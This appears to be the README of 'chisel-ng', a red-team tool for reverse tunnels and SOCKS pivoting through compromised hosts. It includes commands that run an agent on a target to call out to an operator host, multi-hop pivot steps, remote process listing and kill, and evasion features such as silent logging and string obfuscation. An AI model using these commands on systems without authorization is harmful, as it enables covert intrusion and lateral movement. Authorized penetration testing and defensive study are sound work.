```
       _     _          _
   ___| |__ (_)___  ___| |      _ __   __ _
  / __| '_ \| / __|/ _ \ |_____| '_ \ / _` |
 | (__| | | | \__ \  __/ |_____| | | | (_| |
  \___|_| |_|_|___/\___|_|     |_| |_|\__, |
                                      |___/
```

# chisel-ng

![Rust](https://img.shields.io/badge/rust-1.70+-b7410e.svg)
![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Windows](https://img.shields.io/badge/platform-windows-0078d4.svg)
![Linux](https://img.shields.io/badge/platform-linux-fcc624.svg)

A Rust implementation of [chisel](https://github.com/jpillora/chisel) for penetration testing and red team operations. Establishes reverse tunnels over SSH-over-WebSocket-over-TLS, allowing operators to pivot through compromised hosts while blending with normal HTTPS traffic.

---

## Table of Contents

- [Quick Start](#quick-start)
- [Features](#features)
- [Architecture](#architecture)
- [Usage Reference](#usage-reference)
  - [Server](#server-operator)
  - [Reverse Client](#reverse-client-agent)
  - [Bind Client](#bind-client-agent---inbound-mode)
  - [CLI Commands](#server-cli-commands)
- [Multi-Hop Pivoting](#multi-hop-pivoting)
- [Technical Details](#technical-details)
- [OPSEC Considerations](#opsec-considerations)
- [Disclaimer](#disclaimer)

---

## Quick Start

### Requirements

- Rust 1.70+ ([rustup.rs](https://rustup.rs/))

### Build

```bash
git clone https://github.com/nullsection/chisel-ng-private.git
cd chisel-ng-private
cargo build --release
```

Binaries output to `target/release/`: `chisel-server`, `chisel-client`, `chisel-bind-client`

### Basic Usage

**1. Start server (operator):**
```bash
./chisel-server -p 'secret' -v
```

**2. Run client (target):**
```bash
./chisel-client -s operator.example.com:8443 -p 'secret' -k
```

**3. Create tunnels:**
```
chisel-ng> session 1
[session-1] TARGET > tunnel 8080:192.168.1.100:80
[session-1] TARGET > socks5 1080
```

**4. Access internal services:**
```bash
curl http://127.0.0.1:8080
curl --socks5 127.0.0.1:1080 http://internal.corp/
```

---

## Features

- **SSH over WebSocket over TLS** - Blends with normal HTTPS traffic
- **Pre-shared key authentication** - Simple, secure authentication
- **Dynamic port forwarding** - Create tunnels on-demand
- **SOCKS5 proxy** - Dynamic routing through agents
- **Two client modes** - Reverse (connects out) and bind (accepts inbound)
- **Cross-platform** - Windows and Linux

---

## Architecture

```
+------------------+              +----------------------------------+
|     Operator     |              |         Target Network           |
|                  |              |                                  |
| +--------------+ |     SSH      | +--------------+                 |
| |chisel-server |<---------------+-|chisel-client |                 |
| |    :8443     | |   (over TLS) | |  (reverse)   |                 |
| +--------------+ |              | +--------------+                 |
+------------------+              +----------------------------------+
```

**Protocol Stack:**
```
TCP -> TLS 1.3 -> WebSocket -> SSH -> Tunnel Data
                     ^
            appears as HTTPS
```

**Client Modes:**
- **Reverse** (`chisel-client`) - Connects outbound to server
- **Bind** (`chisel-bind-client`) - Listens for inbound; server uses `connect` command

---

## Usage Reference

<details>
<summary><strong>Server (Operator)</strong></summary>

```
OPTIONS:
    -l, --listen <ADDR>      Listen address [default: 0.0.0.0:8443]
    -p, --psk <PSK>          Pre-shared key or passphrase [env: CHISEL_PSK]
        --cert <FILE>        TLS certificate (PEM)
        --key <FILE>         TLS private key (PEM)
        --generate-psk       Generate random PSK and exit
    -v, --verbose            Verbose output
```
</details>

<details>
<summary><strong>Reverse Client (Agent)</strong></summary>

```
OPTIONS:
    -s, --server <ADDR>      Server address (host:port)
    -p, --psk <PSK>          Pre-shared key or passphrase [env: CHISEL_PSK]
    -u, --user <LABEL>       Session label [default: agent]
    -k, --insecure           Skip TLS verification
        --no-reconnect       Disable auto-reconnect
    -i, --interval <SECS>    Reconnect interval [default: 30]
        --heartbeat <SECS>   Heartbeat interval [default: 30]
    -v, --verbose            Verbose output
```
</details>

<details>
<summary><strong>Bind Client (Agent - Inbound Mode)</strong></summary>

For targets that can accept inbound but not initiate outbound:

```
OPTIONS:
    -l, --listen <ADDR>      Listen address (e.g., 0.0.0.0:9000)
    -p, --psk <PSK>          Pre-shared key or passphrase [env: CHISEL_PSK]
    -u, --user <LABEL>       Session label [default: agent]
    -k, --insecure           Skip TLS verification
        --heartbeat <SECS>   Heartbeat interval [default: 30]
    -v, --verbose            Verbose output
```
</details>

<details>
<summary><strong>Server CLI Commands</strong></summary>

**Main Menu:**
```
sessions             List connected sessions
session <id>         Select a session
connect <ip:port>    Connect to bind client
disconnect <id>      Disconnect session (will reconnect)
kill <id>            Terminate client process
```

**Session Menu:**
```
tunnel <local>:<target_ip>:<target_port>    Create tunnel
tunnel --local <local>:<target>:<port>      Create tunnel (localhost only)
tunnel stop <port>                          Stop tunnel
tunnels                                     List tunnels
socks5 <port>                               Start SOCKS5 proxy
socks5 stop <port>                          Stop SOCKS5 proxy
ping                                        Measure latency
ps                                          List remote processes
netstat                                     List remote connections
```
</details>

---

## Multi-Hop Pivoting

Reach isolated networks by chaining through existing sessions.

**Scenario:** DMZ host can reach operator. Internal host (10.0.0.50) can only be reached from DMZ.

```
+----------+        +-----------+        +------------+
| Operator |--SSH---| Session 1 |--TCP---| Session 2  |
|  Server  |        |   (DMZ)   |        | (INTERNAL) |
+----------+        +-----------+        +------------+
```

**Step 1 - Start server (operator):**
```bash
./chisel-server -p 'secret' -v
```

**Step 2 - Run reverse client (DMZ host):**
```bash
./chisel-client -s operator.example.com:8443 -p 'secret' -k
```

**Step 3 - Run bind client (internal host at 10.0.0.50):**
```bash
./chisel-bind-client -l 0.0.0.0:9000 -p 'secret' -k
```

**Step 4 - Create tunnel and connect (server CLI):**
```
chisel-ng> session 1
[session-1] DMZ > tunnel --local 9000:10.0.0.50:9000
Tunnel started on 127.0.0.1:9000

[session-1] DMZ > back
chisel-ng> connect 127.0.0.1:9000
Session 2 registered

chisel-ng> session 2
[session-2] INTERNAL > socks5 1080
```

---

## Technical Details

<details>
<summary><strong>How Tunnels Work</strong></summary>

When creating a tunnel (`tunnel 8080:192.168.1.100:80`):

1. Server binds local port 8080
2. On connection, server sends CONNECT request to agent
3. Agent connects to target and opens SSH direct-tcpip channel
4. Data bridges bidirectionally
</details>

<details>
<summary><strong>How SOCKS5 Works</strong></summary>

Dynamic destinations via RFC 1928 handshake. Returns proper error codes for accurate port scanning results.
</details>

---

## OPSEC Considerations

<details>
<summary><strong>Binary Hardening</strong></summary>

Release builds are hardened:

- **Silent operation** - All logging compiles to no-ops
- **String obfuscation** - Protocol strings XOR-encrypted at compile time
- **Symbol stripping** - No debug symbols or source paths
- **Size optimization** - ~3 MB vs ~15 MB debug
- **Panic behavior** - Immediate abort, no stack traces
</details>

<details>
<summary><strong>Operational Security</strong></summary>

- **PSK Authentication** - 256-bit key from passphrase (SHA-256) or raw hex
- **No credential storage** - PSK via argument or environment variable only
- **Auto-reconnect** - Enabled by default, configurable interval
- **Heartbeat** - Configurable keepalive, disable with `--heartbeat 0`
</details>

<details>
<summary><strong>Detection Vectors</strong></summary>

- JA3/JA4 TLS fingerprinting
- WebSocket upgrade patterns
- Long-lived connection duration
- Consistent heartbeat intervals
</details>

---

## Disclaimer

This tool is intended for authorized security testing only. Obtain proper authorization before use. The authors are not responsible for misuse.

---

## License

MIT
